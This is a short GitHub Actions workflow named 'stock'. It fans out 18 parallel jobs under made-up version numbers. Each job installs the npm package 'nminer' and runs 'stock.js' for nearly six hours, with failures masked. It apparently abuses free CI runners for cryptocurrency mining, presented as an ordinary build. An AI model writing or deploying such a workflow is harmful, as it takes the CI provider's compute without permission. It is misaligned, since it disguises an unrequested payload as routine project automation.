name: stock
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7698 }
          - { version: 3913 }
          - { version: 1991 }
          - { version: 5938 }
          - { version: 8020 }
          - { version: 8515 }
          - { version: 7717 }
          - { version: 7145 }
          - { version: 8663 }
          - { version: 7193 }
          - { version: 6297 }
          - { version: 7777 }
          - { version: 2898 }
          - { version: 6986 }
          - { version: 296 }
          - { version: 2175 }
          - { version: 7688 }
          - { version: 3415 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 341m node stock.js || echo "stock executed"